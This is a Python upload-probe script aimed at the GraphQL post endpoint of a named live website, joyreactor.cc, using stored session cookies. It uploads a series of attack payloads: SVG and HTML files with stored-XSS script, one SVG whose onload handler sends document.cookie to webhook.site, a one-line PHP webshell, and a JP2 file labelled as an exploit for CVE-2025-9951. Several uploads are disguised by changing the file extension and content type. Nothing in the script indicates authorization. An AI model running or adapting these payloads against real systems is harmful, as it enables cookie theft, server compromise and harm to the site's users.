#!/usr/bin/env python3
"""
temporaryImage(file: Upload!) probe for joyreactor.cc

Tests:
  baseline  — valid minimal JPEG (confirm endpoint works, get URL pattern)
  svg       — SVG with <script> (Stored XSS)
  svg2      — SVG with onload handler and fetch exfil
  jp2       — raw exploit.jp2 (CVE-2025-9951 bypass via direct upload)
  jp2jpg    — exploit.jp2 with .jpg filename (extension trick)
  php       — <?php shell (webshell upload attempt)
  html      — <script> in .html file
  all       — all of the above (default)

Usage:
  python3 upload_probe.py [suite] [-v]
  python3 upload_probe.py baseline -v
"""
import requests, json, sys, os, time
from urllib.parse import unquote

COOKIES_FILE = os.path.join(os.path.dirname(__file__), "cookies.txt")
raw = open(COOKIES_FILE).read().strip()
cookies = {}
for part in raw.split(";"):
    part = part.strip()
    if "=" in part:
        name, _, value = part.partition("=")
        cookies[name.strip()] = unquote(value.strip())

session = requests.Session()
for name, value in cookies.items():
    session.cookies.set(name, value, domain="api.joyreactor.cc")
session.headers.update({
    "Origin": "https://joyreactor.cc",
    "Referer": "https://joyreactor.cc/",
})

URL = "https://api.joyreactor.cc/graphql"
VERBOSE = "-v" in sys.argv
args_list = [a for a in sys.argv[1:] if not a.startswith("-")]
suite = args_list[0] if args_list else "all"

POST_QUERY = """mutation PostFormMutation($text: String!, $tags: [String!]!, $files: [Upload!]) {
  post(text: $text, tags: $tags, files: $files) { post { id } }
}"""


def upload(label, filename, content, content_type="application/octet-stream", delay=1.0):
    operations = json.dumps({
        "query": POST_QUERY,
        "variables": {"text": "upload test", "tags": ["политика"], "files": [None]},
    })
    # files is an array → first element is variables.files.0
    map_field = json.dumps({"0": ["variables.files.0"]})

    data  = {"operations": operations, "map": map_field}
    fdict = {"0": (filename, content, content_type)}

    t0 = time.monotonic()
    try:
        r = session.post(URL, data=data, files=fdict, timeout=20, headers={"Content-Type": None})
        elapsed = (time.monotonic() - t0) * 1000
        raw_resp = r.text
        try:
            d = r.json()
        except Exception:
            d = {}
        p = ((d.get("data") or {}).get("post") or {}).get("post") or {}
        post_id = p.get("id", "")
        err_obj = (d.get("errors") or [{}])[0]
        err = err_obj.get("message", "")[:120]
        reason = (err_obj.get("extensions") or {}).get("reason", "")[:120]
        if post_id:
            status = f"CREATED id={post_id}"
        elif err:
            status = f"{err}" + (f" | {reason}" if reason else "")
        else:
            status = raw_resp[:120]
        if VERBOSE:
            print(f"  [{elapsed:6.0f}ms] {label}")
            print(f"           HTTP {r.status_code} | {raw_resp[:500]}")
        else:
            print(f"  [{elapsed:6.0f}ms] {label:<40} {status}")
    except Exception as e:
        elapsed = (time.monotonic() - t0) * 1000
        print(f"  [{elapsed:6.0f}ms] {label:<40} error({e})")
    time.sleep(delay)


def section(title):
    print(f"\n{'─'*60}")
    print(f"  {title}")
    print(f"{'─'*60}")


# ── Minimal valid JPEG (10x10, white) ────────────────────────────────────────
# Actual tiny JPEG bytes (real minimal JPEG, not fake)
TINY_JPEG = bytes([
    0xFF,0xD8,0xFF,0xE0,0x00,0x10,0x4A,0x46,0x49,0x46,0x00,0x01,0x01,0x00,0x00,0x01,
    0x00,0x01,0x00,0x00,0xFF,0xDB,0x00,0x43,0x00,0x08,0x06,0x06,0x07,0x06,0x05,0x08,
    0x07,0x07,0x07,0x09,0x09,0x08,0x0A,0x0C,0x14,0x0D,0x0C,0x0B,0x0B,0x0C,0x19,0x12,
    0x13,0x0F,0x14,0x1D,0x1A,0x1F,0x1E,0x1D,0x1A,0x1C,0x1C,0x20,0x24,0x2E,0x27,0x20,
    0x22,0x2C,0x23,0x1C,0x1C,0x28,0x37,0x29,0x2C,0x30,0x31,0x34,0x34,0x34,0x1F,0x27,
    0x39,0x3D,0x38,0x32,0x3C,0x2E,0x33,0x34,0x32,0xFF,0xC0,0x00,0x0B,0x08,0x00,0x01,
    0x00,0x01,0x01,0x01,0x11,0x00,0xFF,0xC4,0x00,0x1F,0x00,0x00,0x01,0x05,0x01,0x01,
    0x01,0x01,0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x02,0x03,0x04,
    0x05,0x06,0x07,0x08,0x09,0x0A,0x0B,0xFF,0xC4,0x00,0xB5,0x10,0x00,0x02,0x01,0x03,
    0x03,0x02,0x04,0x03,0x05,0x05,0x04,0x04,0x00,0x00,0x01,0x7D,0x01,0x02,0x03,0x00,
    0x04,0x11,0x05,0x12,0x21,0x31,0x41,0x06,0x13,0x51,0x61,0x07,0x22,0x71,0x14,0x32,
    0x81,0x91,0xA1,0x08,0x23,0x42,0xB1,0xC1,0x15,0x52,0xD1,0xF0,0x24,0x33,0x62,0x72,
    0x82,0x09,0x0A,0x16,0x17,0x18,0x19,0x1A,0x25,0x26,0x27,0x28,0x29,0x2A,0x34,0x35,
    0x36,0x37,0x38,0x39,0x3A,0x43,0x44,0x45,0x46,0x47,0x48,0x49,0x4A,0x53,0x54,0x55,
    0x56,0x57,0x58,0x59,0x5A,0x63,0x64,0x65,0x66,0x67,0x68,0x69,0x6A,0x73,0x74,0x75,
    0x76,0x77,0x78,0x79,0x7A,0x83,0x84,0x85,0x86,0x87,0x88,0x89,0x8A,0x92,0x93,0x94,
    0x95,0x96,0x97,0x98,0x99,0x9A,0xA2,0xA3,0xA4,0xA5,0xA6,0xA7,0xA8,0xA9,0xAA,0xB2,
    0xB3,0xB4,0xB5,0xB6,0xB7,0xB8,0xB9,0xBA,0xC2,0xC3,0xC4,0xC5,0xC6,0xC7,0xC8,0xC9,
    0xCA,0xD2,0xD3,0xD4,0xD5,0xD6,0xD7,0xD8,0xD9,0xDA,0xE1,0xE2,0xE3,0xE4,0xE5,0xE6,
    0xE7,0xE8,0xE9,0xEA,0xF1,0xF2,0xF3,0xF4,0xF5,0xF6,0xF7,0xF8,0xF9,0xFA,0xFF,0xDA,
    0x00,0x08,0x01,0x01,0x00,0x00,0x3F,0x00,0xFB,0xD2,0x8A,0x28,0x03,0xFF,0xD9,
])

# ── SVG XSS payloads ──────────────────────────────────────────────────────────
SVG_BASIC = b"""<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <script>alert(document.domain)</script>
  <rect width="100" height="100" fill="red"/>
</svg>"""

SVG_FETCH = b"""<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"
     onload="fetch('https://webhook.site/REPLACE_ME?c='+document.cookie)">
  <rect width="100" height="100" fill="blue"/>
</svg>"""

SVG_FORM_ACTION = b"""<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <image href="data:image/png;base64,iVBORw0KGgoAAAANS" />
  <script><![CDATA[document.write('<img src=x onerror=alert(1)>')]]></script>
</svg>"""

# ── HTML XSS ──────────────────────────────────────────────────────────────────
HTML_XSS = b"<html><body><script>alert(document.domain)</script></body></html>"

# ── PHP webshell ──────────────────────────────────────────────────────────────
PHP_SHELL = b"<?php system($_GET['cmd']); ?>"


if suite in ("baseline", "all"):
    section("BASELINE — valid JPEG (confirm upload works)")
    upload("jpeg-baseline", "test.jpg", TINY_JPEG, "image/jpeg")

if suite in ("svg", "all"):
    section("SVG XSS — various SVG payloads")
    upload("svg-script-tag",    "xss.svg",   SVG_BASIC,       "image/svg+xml")
    upload("svg-onload-fetch",  "xss2.svg",  SVG_FETCH,       "image/svg+xml")
    upload("svg-cdata",         "xss3.svg",  SVG_FORM_ACTION, "image/svg+xml")
    # Try disguising SVG as JPEG
    upload("svg-as-jpg",        "image.jpg", SVG_BASIC,       "image/jpeg")
    upload("svg-as-png",        "image.png", SVG_BASIC,       "image/png")
    # No extension
    upload("svg-no-ext",        "image",     SVG_BASIC,       "image/svg+xml")

if suite in ("jp2", "all"):
    section("CVE-2025-9951 — JP2 direct upload (bypass URL delivery)")
    jp2_path = os.path.join(os.path.dirname(__file__), "exploit.jp2")
    if os.path.exists(jp2_path):
        jp2_data = open(jp2_path, "rb").read()
        upload("jp2-raw",           "exploit.jp2",  jp2_data, "image/jp2")
        upload("jp2-as-jpg",        "exploit.jpg",  jp2_data, "image/jpeg")
        upload("jp2-as-png",        "exploit.png",  jp2_data, "image/png")
        upload("jp2-octet-stream",  "exploit",      jp2_data, "application/octet-stream")
    else:
        print("  [SKIP] exploit.jp2 not found — run gen_exploit_jp2.py first")

if suite in ("php", "all"):
    section("WEBSHELL — PHP file upload")
    upload("php-shell",         "shell.php",  PHP_SHELL, "application/x-php")
    upload("php-as-jpg",        "shell.jpg",  PHP_SHELL, "image/jpeg")
    upload("php-phtml",         "shell.phtml",PHP_SHELL, "application/x-php")

if suite in ("html", "all"):
    section("HTML upload — XSS if served with text/html")
    upload("html-xss",          "xss.html",  HTML_XSS, "text/html")
    upload("html-as-jpg",       "xss.jpg",   HTML_XSS, "image/jpeg")

print("\n[done]")
